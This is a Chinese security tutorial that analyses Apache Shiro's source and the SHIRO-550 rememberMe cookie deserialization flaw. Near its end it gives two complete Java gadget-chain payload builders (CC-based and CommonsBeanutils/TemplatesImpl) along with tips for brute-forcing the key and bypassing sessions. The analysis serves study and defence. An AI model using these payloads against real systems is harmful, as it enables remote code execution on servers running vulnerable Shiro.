## 前言

Shiro是一个功能强大且易于使用的Java安全框架，提供全面的身份验证、授权、密码管理和会话管理功能。它支持多种认证方式，如基于表单、HTTP基本身份验证和RememberMe。授权模型灵活，可细粒度限制访问控制，保护敏感数据和功能。安全会话管理功能确保会话安全，包括记住我功能和会话超时设置。无论是Web应用还是其他Java应用，Shiro都是可靠的选择，增加应用程序的安全性。

在shiro-core库中实现了对认证授权等的抽象，以提供对不同环境的认证和授权。如shiro-web依赖就是对在shiro-core库的技术上进行扩展实现web应用的认证和授权等。在shiro-core库中包括SecurityManager，Authenticator，Authoriser，realm，sessionManager等核心组件，具体关系如下图所示。

![image](https://image.3001.net/images/20230615/1686834715_648b0e1bb9820e6945d29.jpg)

从整体看是由SecurityManager管理的，然后认证和授权依赖于底层的realm从不同的途径获取对应数据。整个过程过程中的加密算法是由Cryptography完成的，在shiro中默认支持的加密算法有MD5/Hash/AES/RSA等。最后由sessionManager进行会话管理，同时还有session缓存等机制支持。

## 环境搭建

这里可以直接直接把官网的项目拉下来使用。

    
    
    git clone https://github.com/apache/shiro.git
    git checkout shiro-root-1.2.4 //切换到1.2.4版本
    

打开后需要修改shiro/samples/web/pom.xml路径下jstl的依赖版本，否则会出现jsp解析报错。

![image](https://image.3001.net/images/20230615/1686834777_648b0e59bce9f0eb20bbf.png)

最后配置好tomcat，然后选择对应项目就可以跑起来了。

![image](https://image.3001.net/images/20230615/1686834811_648b0e7bb90214a73c25f.png)

![image](https://image.3001.net/images/20230615/1686834839_648b0e9780a7288d8994e.png)

## 源码分析

### 入口点

shiro与web应用是通过一个过滤器绑定的，在web.xml中就可以看到。

![image](https://image.3001.net/images/20230615/1686834885_648b0ec55883c85bcf0ef.png!small)

所有的请求都将被ShiroFilter拦截，同时在过滤器之前还有一个listener，它在filter之前被初始化，它的作用就是为ShiroFilter初始化提供web环境的依赖对象。

### ShiroFilter初始化

ShiroFilter是Filter的子类，由于它的匹配规则是/*，所以所有的请求都会被他处理。先来看一下它的继承关系。

![image](https://image.3001.net/images/20230615/1686834906_648b0eda2f5babe8d630f.png)

首先找到对应的初始化方法org.apache.shiro.web.servlet.AbstractFilter#init。

    
    
    public final void init(FilterConfig filterConfig) throws ServletException {
        setFilterConfig(filterConfig);
        try {
            onFilterConfigSet();
        } catch (Exception e) {
    ......
    }
    public void setFilterConfig(FilterConfig filterConfig) {
        this.filterConfig = filterConfig;
        setServletContext(filterConfig.getServletContext());//设置servletContext
    }
    

其中的参数FilterConfig是由调用者ApplicationFilterConfig初始化时传递的自身，每一个filter都由ApplicationFilterConfig来管理最后存放在StandardContext#filterConfigs中。具体filter初始化的代码就不再深入了，有兴趣的同学可以再去结合tomcat的源码看看，有助于后面学习通过shiro注入filter内存马。

    
    
    protected final void onFilterConfigSet() throws Exception {
        //added in 1.2 for SHIRO-287:
        applyStaticSecurityManagerEnabledConfig();//安全配置检查是否使用静态安全管理器
        init();
        ensureSecurityManager();//检查securitymanager，否则初始化DefaultWebSecurityManager
        //added in 1.2 for SHIRO-287:
        if (isStaticSecurityManagerEnabled()) {
            SecurityUtils.setSecurityManager(getSecurityManager());
        }
    }
    
    public void init() throws Exception {
        WebEnvironment env = WebUtils.getRequiredWebEnvironment(getServletContext());
    
        setSecurityManager(env.getWebSecurityManager());
    
        FilterChainResolver resolver = env.getFilterChainResolver();
        if (resolver != null) {
            setFilterChainResolver(resolver);
        }
    }
    

这里才调用了ShiroFilter#init方法，首先从servletContext中获取WebEnvironment对象，这个对象是在前面配置的listener初始化时创建的。同时初始化了securityManager对象，最后从WebEnvironment中获取SecurityManager以及FilterChainResolver(内置过滤器)。

### WebEnvironment创建

在前面的web.xml配置文件中可以看到除了filter之外还配置了一个EnvironmentLoaderListener，在初始化时就会调用其父类的EnvironmentLoader#initEnvironment方法。

![image](https://image.3001.net/images/20230615/1686834951_648b0f070fc6e77c40245.png!small)

前面看到在EnvironmentLoaderListener初始化中创建了WebEnvironment对象,调用了createEnvironment方法

    
    
    protected WebEnvironment createEnvironment(ServletContext sc) {
        Class<?> clazz = determineWebEnvironmentClass(sc);
    		....
        MutableWebEnvironment environment = (MutableWebEnvironment) ClassUtils.newInstance(clazz);
        environment.setServletContext(sc);
    		...
        customizeEnvironment(environment);
        LifecycleUtils.init(environment);
        return environment;
    }
    protected Class<?> determineWebEnvironmentClass(ServletContext servletContext) {
        String className = servletContext.getInitParameter(ENVIRONMENT_CLASS_PARAM);
        if (className != null) {
            try {
                return ClassUtils.forName(className);
            } catch (UnknownClassException ex) {
                throw new ConfigurationException(
                        "Failed to load custom WebEnvironment class [" + className + "]", ex);
            }
        } else {
            return IniWebEnvironment.class;
        }
    }
    

在创建WebEnvironment是也会首先查找servletcontext中是否自定义配置，默认使用IniWebEnvironment，及使用ini配置文件初始化securitymanager。然后初始化默认的内置过滤器

    
    
    public void init() {
        Ini ini = getIni();
    
    		......
    
        setIni(ini);
    
        configure();
    }
    
    protected void configure() {
    
        this.objects.clear();
    
        WebSecurityManager securityManager = createWebSecurityManager();//创建默认wsm
        setWebSecurityManager(securityManager);
    
        FilterChainResolver resolver = createFilterChainResolver();//初始化默认过滤器
        if (resolver != null) {
            setFilterChainResolver(resolver);
        }
    }
    

最后WebEnvironment的初始化结束调用servletContext.setAttribute(ENVIRONMENT_ATTRIBUTE_KEY,
environment)设置到ApplicationContext的attributes属性中，最后在ShiroFilter初始化时就会获取该对象中的WebEnvironment和FilterChainResolver。

### ShiroFilter过滤器

上面分析了ShiroFilter的初始化的过程，下面就来看看在我们shiro框架下的web应用是怎么实现安全访问控制的。

首先从OncePerRequestFilter#doFilter方法入手，他是Filter接口中定义的方法。在tomcat处理完请求的封装时在就会依次调用所有注册的filter的doFilter方法。

    
    
    public final void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) throws ServletException, IOException {
        String alreadyFilteredAttributeName = getAlreadyFilteredAttributeName();
        if ( request.getAttribute(alreadyFilteredAttributeName) != null ) {
            filterChain.doFilter(request, response);//防止同一个过滤器调用两次
        } else //noinspection deprecation
            if ( !isEnabled(request, response) || shouldNotFilter(request) ) {
            filterChain.doFilter(request, response);
        } else {
            request.setAttribute(alreadyFilteredAttributeName, Boolean.TRUE);
            try {
                doFilterInternal(request, response, filterChain);
            } finally {
                request.removeAttribute(alreadyFilteredAttributeName);
            }
        }
    }
    

然后回调用父类的AbstractShiroFilter#doFilterInternal方法

    
    
    protected void doFilterInternal(ServletRequest servletRequest, ServletResponse servletResponse, final FilterChain chain)
            throws ServletException, IOException {
    
        Throwable t = null;
    
        try {
            final ServletRequest request = prepareServletRequest(servletRequest, servletResponse, chain);
            final ServletResponse response = prepareServletResponse(request, servletResponse, chain);
    
            final Subject subject = createSubject(request, response);
    
            //noinspection unchecked
            subject.execute(new Callable() {
                public Object call() throws Exception {
                    updateSessionLastAccessTime(request, response);
                    executeChain(request, response, chain);
                    return null;
                }
            });
        } catch (ExecutionException ex) {
            t = ex.getCause();
        } catch (Throwable throwable) {
            t = throwable;
        }
    ...
    }
    

在这个方法里面首先对tomcat中的request和response对象重写进行了封装，然后主要代码如下：

    
    
    final Subject subject = createSubject(request, response);//由securitymanager创建
    subject.execute(new Callable() {
        public Object call() throws Exception {
            updateSessionLastAccessTime(request, response);
            executeChain(request, response, chain);//匹配请求URL执行内置过滤器
            return null;
        }
    });
    

首先来看创建subject的过程

由于这是web环境，所有在shiro-web里面重写了WebSubject继承subject，以及其内部的builder静态内部类。

![image](https://image.3001.net/images/20230615/1686835000_648b0f38248aeaa627e88.png!small)

在创建过程中先初始化了WebSubject.Builder类，然后调用Builder.buildSubject，最后调用了SecurityManager#createSubject，其中
的subjectContext是在Builder初始化时创建的DefaultSubjectContext类，这个类负责处理本次会话的上下文对象，它的本质是一个Hashmap。  
![image](https://image.3001.net/images/20230615/1686835025_648b0f512b1bbb3a05f05.png)

在初始化结束时默认存在如下对象  
![image](https://image.3001.net/images/20230615/1686835158_648b0fd6681fc4562be08.png!small)

在DefaultSecurityManager#createSubject(SubjectContext)中首先克隆了一个context对象，然后依次检查其中的securitymanger，session，PrincipalCollection对象，如果不存在则创建并添加，最后再以这个context创建subject对象。

    
    
    public Subject createSubject(SubjectContext subjectContext) {
        SubjectContext context = copy(subjectContext);
    
        context = ensureSecurityManager(context);
    
        context = resolveSession(context);
    
        context = resolvePrincipals(context);
    
        Subject subject = doCreateSubject(context);
    
        save(subject);
    
        return subject;
    }
    

其中shiro550漏洞就是在resolvePrincipals时触发的。我们可以简单跟进看一下。

    
    
    protected SubjectContext resolvePrincipals(SubjectContext context) {
    
            PrincipalCollection principals = context.resolvePrincipals();
    
            if (CollectionUtils.isEmpty(principals)) {
                principals = getRememberedIdentity(context);
                if (!CollectionUtils.isEmpty(principals)) {
                    context.setPrincipals(principals);
                } else {
                }
            }
    
            return context;
        }
    

前面代码逻辑还是差不多的，先从context中获取principal对象，然后检查是是否为空，如果为空则调用getRememberedIdentity创建然后设置到context中，否则直接返回，所以如果要触发反序列化这里必须要为空。我们跟进resolvePrincipals方法中看一下。

    
    
    public PrincipalCollection resolvePrincipals() {
        PrincipalCollection principals = getPrincipals();
    
        if (CollectionUtils.isEmpty(principals)) {
            AuthenticationInfo info = getAuthenticationInfo();
            if (info != null) {
                principals = info.getPrincipals();
            }
        }
    
        if (CollectionUtils.isEmpty(principals)) {
            Subject subject = getSubject();
            if (subject != null) {
                principals = subject.getPrincipals();
            }
        }
    
        if (CollectionUtils.isEmpty(principals)) {
            Session session = resolveSession();
            if (session != null) {
                principals = (PrincipalCollection) session.getAttribute(PRINCIPALS_SESSION_KEY);
            }
        }
    
        return principals;
    }
    

这个方法就和前面的resolveSession有点不太一样了，他第一次调用了getPrincipals如果为空还从其地方也获取了相关对象来构建principals，可以看到最后也获取了session对象。如果前面已经设置了session对象，那么这里返回的就一定不会是null，最后就不会调用rememberMe导致反序列化。所以我们在利用shiro反序列化时一定要删除cookie中的JSESSIONID字段。

最后使用context创建对应环境的subject对象，这个对象是shiro框架对开发者使用的一个接口对象，在登录及认证授权时都是调用的该对象，由他内部再去调用securitymanager对象的操作。

最后回到AbstractShiroFilter#doFilterInternal中，调用了Subject#execute(java.util.concurrent.Callable)方法，传入了updateSessionLastAccessTime和executeChain方法。这里如果直接跟进这两个方法回错过一个细节，就是将subject对象设置打ThreadLocal中，但由于这个和shiro中的漏洞关系不大就不再跟进分析了。

updateSessionLastAccessTime方法没什么用就不说了，下面跟进executeChain说一下shiro中的路径匹配。

![image](https://image.3001.net/images/20230615/1686835211_648b100bb86742f06bbca.png)

在这个方法里面就分两步，第一步根据request获取对应的过滤器，然后第二部执行过滤方法。

    
    
    protected FilterChain getExecutionChain(ServletRequest request, ServletResponse response, FilterChain origChain) {
        FilterChain chain = origChain;
        FilterChainResolver resolver = getFilterChainResolver();
        if (resolver == null) {
    ...
            return origChain;
        }
        FilterChain resolved = resolver.getChain(request, response, origChain);
    ...
        return chain;
    }
    
    public FilterChain getChain(ServletRequest request, ServletResponse response, FilterChain originalChain) {
        FilterChainManager filterChainManager = getFilterChainManager();
        if (!filterChainManager.hasChains()) {
            return null;
        }
    
        String requestURI = getPathWithinApplication(request);
    
        for (String pathPattern : filterChainManager.getChainNames()) {
            if (pathMatches(pathPattern, requestURI)) {
                return filterChainManager.proxy(originalChain, pathPattern);
            }
        }
    
        return null;
    }
    

首先获取FilterChainResolver对象，这个对象就是在WebEnvironment创建时初始化的，然后在ShiroFilter初始化时设置到该类的属性中。然后根据请求URL匹配对应的过滤器，最后创建一个filterChain的静态代理类。其中shiro权限绕过的原因主要就是由于路径匹配时匹配到了错误的过滤器或未匹配到shiro内置的过滤器，导致绕过shiro的过滤器检查，但其请求URL被tomcat过滤器处理后仍然能获取对应的资源。

## SHIRO-550

### 源码分析

上面分析了shiro框架的大概流程，在介绍DefaultSecurityManager#createSubject(SubjectContext)中创建Principal时就会对cookie中的rememberMe解析并反序列化。下面就从这开始进行深入分析。

首先进入org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity方法。

    
    
    protected PrincipalCollection getRememberedIdentity(SubjectContext subjectContext) {
        RememberMeManager rmm = getRememberMeManager();
        if (rmm != null) {
            try {
                return rmm.getRememberedPrincipals(subjectContext);
            } catch (Exception e) {
    ......
            }
        }
        return null;
    }
    public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
        PrincipalCollection principals = null;
        try {
            byte[] bytes = getRememberedSerializedIdentity(subjectContext);
            if (bytes != null && bytes.length > 0) {
                principals = convertBytesToPrincipals(bytes, subjectContext);
            }
        } catch (RuntimeException re) {
            principals = onRememberedPrincipalFailure(re, subjectContext);
        }
    
        return principals;
    }
    

其中getRememberedSerializedIdentity方法主要是获取rememberMe的值并进行base64解密，然后convertBytesToPrincipals对base64解密后的值进行AES解密并反序列化。注意这里的异常捕获，先提一下后面再回来分析。我们继续跟进convertBytesToPrincipals方法。

![image](https://image.3001.net/images/20230615/1686835237_648b102520edfb02f4e30.png)

这个方法里面也分两步，第一步对字节数组进行AES解密，第二步进行反序列化。

![image](https://image.3001.net/images/20230615/1686835260_648b103c1dc9cf51c08ea.png)

在解密时就会获取AES密钥，由于这个密钥在对象构造函数中初始化为了默认密钥，导致攻击者可以根据密钥进行伪造恶意的反序列化数据进行代码执行。

我们再来看反序列化的方法。

![image](https://image.3001.net/images/20230615/1686835285_648b10559e31e70f98552.png)

这里调用了readObject方法导致反序列化，注意这里的调用类并不直接是ObjectInputStream对象，而是自定义的一个继承ObjectInputStream的类，并重写了resolveClass方法。

![image](https://image.3001.net/images/20230615/1686835305_648b1069bba06a0399554.png)

在原生java反序列化底层代码中该方法的作用是根据其读取到完全限定名调用Class.forName()进行类加载获取对应的Class对象。这里重写该方法主要是为了使用指定的类加载器来进行类加载，因为在tomcat中打破了双亲委派的机制都是使用的自定义类加载进行类加载，我们跟进该方法也可以看到它首先就从进程中获取了不同的类加载器进行类加载。

    
    
    public static Class forName(String fqcn) throws UnknownClassException {
        Class clazz = THREAD_CL_ACCESSOR.loadClass(fqcn);
        if (clazz == null) {
            clazz = CLASS_CL_ACCESSOR.loadClass(fqcn);
        }
        if (clazz == null) {
            clazz = SYSTEM_CL_ACCESSOR.loadClass(fqcn);
        }
        if (clazz == null) {
            String msg = "Unable to load class named [" + fqcn + "] from the thread context, current, or " +
                    "system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.";
            throw new UnknownClassException(msg);
        }
        return clazz;
    }
    

正是由于这里自定义了类加载器，主要都是通过类名然后去找对应的class文件，然后通过defineclass进行类加载。但是由于java中数组的类对象是由jvm创建的，没有对应的class文件，导致在利用时反序列化数组对象时回抛出如下异常。这也是在shiro中利用cc链的一大限制，但并不是主要原因，其他原因在后面分析利用链时再说。

![image](https://image.3001.net/images/20230615/1686835328_648b1080584ea72635655.png)

刚刚为了使整个分析流程更加顺畅，所以没有提DefaultSecurityManager#getRememberedIdentity方法中抛出的异常。

    
    
    protected PrincipalCollection onRememberedPrincipalFailure(RuntimeException e, SubjectContext context) {
        forgetIdentity(context);
        throw e;
    }
    public void forgetIdentity(SubjectContext subjectContext) {
        if (WebUtils.isHttp(subjectContext)) {
            HttpServletRequest request = WebUtils.getHttpRequest(subjectContext);
            HttpServletResponse response = WebUtils.getHttpResponse(subjectContext);
            forgetIdentity(request, response);
        }
    }
    private void forgetIdentity(HttpServletRequest request, HttpServletResponse response) {
        getCookie().removeFrom(request, response);
    }
    

从上面的调用链跟踪最后来到SimpleCookie#removeFrom，在这添加了一个cookie为rememberMe=deleteMe，这也是识别shiro框架的特征。同时看整个异常的位置是在base64解密之前，就是从base64解密开始后面的AES解密以及反序列化过程只要抛出了没有被处理的异常最后都会被捕获，设置rememberMe=deleteMe。

![image](https://image.3001.net/images/20230615/1686835385_648b10b914b6cf17e1cee.png)

上面是rememberMe的解密过程，下面简单说一下它在登录认证过程中是如何产生的。

在后端对登录请求的处理一般都会先调用SecurityUtils#getSubject获取对应的subject，然后调用login方法，传入由username和password初始化的AuthenticationToken对象。

![image](https://image.3001.net/images/20230615/1686835402_648b10ca2df68cf772570.png)

在认证成功后就会创建一个principals然后加密返回给客户端。

上面对整个流程进行了粗略的分析，可以了解到在正常流程中rememberMe的值就是PrincipalCollection对象序列化数据的加密后的值。所以我们在爆破key的时候就可以利用整个对象，但由于它是一个接口，所以我们一般都会利用他的子类SimplePrincipalCollection进行爆破，然后根据返回结果中是否含有deleteMe判断密钥是否正确。

![image](https://image.3001.net/images/20230615/1686835434_648b10eae4a784c2184e6.png!small)

### 利用链

在前面分析中找到了ObjectInputStream#readObject的调用点，我们利用还需要找到能利用的反序列化链，我们前面了解了CC链，以及URLDNS等。如果直接尝试CC链可能会出现如下报错

![image](https://image.3001.net/images/20230615/1686835451_648b10fb62a932f534582.png!small)

因为在shiro默认的依赖中不好看CC依赖，导致无法反序列化，然后我们补上CC依赖后再打可能又会遇到下面的报错，Unable to load clazz
named
[[Lorg.apache.commons.collections.Transformer;]，这就是由于无法创建Transformer数组导致的。所以在打CC依赖的时候必须要找一条不包含数组的链，这个的原因在上面也说了。

![image](https://image.3001.net/images/20230615/1686835463_648b11072c9f2342cce5d.png!small)

最后在原来的CC链的基础少结合CC2+CC6得出下面这条链。

    
    
    public Object getPayload(String[] args) throws Exception {
        TemplatesImpl templatesImpl = new TemplatesImpl();
    
        Class templatesClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templatesImpl, "123");
    
        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get(args[0]));
        byte[][] codes = new byte[][]{code};
        bytecodesField.set(templatesImpl, codes);
    
        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templatesImpl, new TransformerFactoryImpl());
    
        Field auxClassesField = templatesClass.getDeclaredField("_auxClasses");
        auxClassesField.setAccessible(true);
        auxClassesField.set(templatesImpl, (Object)null);
    
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
    
        Map<Object, Object> map = new HashMap();
        LazyMap lazyMap = (LazyMap)LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templatesImpl);
    
        Map<Object, Object> map1 = new HashMap();
        map1.put(tiedMapEntry, "bbb");
        lazyMap.remove(templatesImpl);
    
        Class c = LazyMap.class;
        Field factoryfield = c.getDeclaredField("factory");
        factoryfield.setAccessible(true);
        factoryfield.set(lazyMap, invokerTransformer);
    
        return map1;
    }
    

或者直接用依赖commons-collections4的CC2也可以。

上面这种方式是需要我们补依赖环境的，在实战中这种方式就会有一定的限制，所以我们在shiro中更多的是使用的它自带的CB链去利用。在前面学习CC链的时候了解到TemplatesImpl这个类，在这个类里面自定义了类加载器，只要调用TemplatesImpl#newTransformer就可以触发类加载。我们继续回溯找到了TrAXFilter的构造函数中调用了该方法，另外还有TemplatesImpl#getOutputProperties中也调用了newTransformer，其中CB链就是用的后面这个点。

可以看到getOutputProperties是一个getter方法，在commons-beanutils中有一个调用任意对象getter的方法org.apache.commons.beanutils.PropertyUtils#getProperty(Object
bean, String
name),它在org.apache.commons.beanutils.BeanComparator#compare中被调用，且参数可控，所以再结合前面CC链的部分最后得出下面的CB链

    
    
    public Object getPayload(String[] args) throws Exception {
        TemplatesImpl templatesImpl = new TemplatesImpl();
    
        Class templatesClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templatesImpl, "123");
    
        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get(args[0]));
        byte[][] codes = new byte[][]{code};
    
        bytecodesField.set(templatesImpl, codes);
    
        Field auxClassesField = templatesClass.getDeclaredField("_auxClasses");
        auxClassesField.setAccessible(true);
        auxClassesField.set(templatesImpl, (Object)null);
    
        BeanComparator beanComparator = new BeanComparator();
        beanComparator.setProperty("outputProperties");
    
        PriorityQueue priorityQueue = new PriorityQueue();
    
        priorityQueue.add(1);
        priorityQueue.add(1);
    
        Class<PriorityQueue> priorityQueueClass = PriorityQueue.class;
    
        Field queueField = priorityQueueClass.getDeclaredField("queue");
        queueField.setAccessible(true);
        Object[] o = (Object[]) queueField.get(priorityQueue);
        o[0] = templatesImpl;
        o[1] = templatesImpl;
    
        Field comparator = priorityQueueClass.getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue,beanComparator);
    
        return priorityQueue;
    }
    

最后也同样实现了命令执行

![image](https://image.3001.net/images/20230615/1686835484_648b111c41250bf62a089.png!small)

## 总结

以上就是关于shiro反序列化的所有分析了，虽然在1.2.4之后shiro就采用了自定义密钥或者随机生成密钥，但真正反序列点还是没有改变，如果存在密钥泄露依然可以导致反序列化。

## 参考资料

[Shiro反序列化漏洞(一)-shiro550流程分析-白日梦组长](https://www.bilibili.com/video/BV1iF411b7bD/)

[Tomcat源码初识一
Tomcat整理流程图](https://blog.csdn.net/u010883443/article/details/107463782)

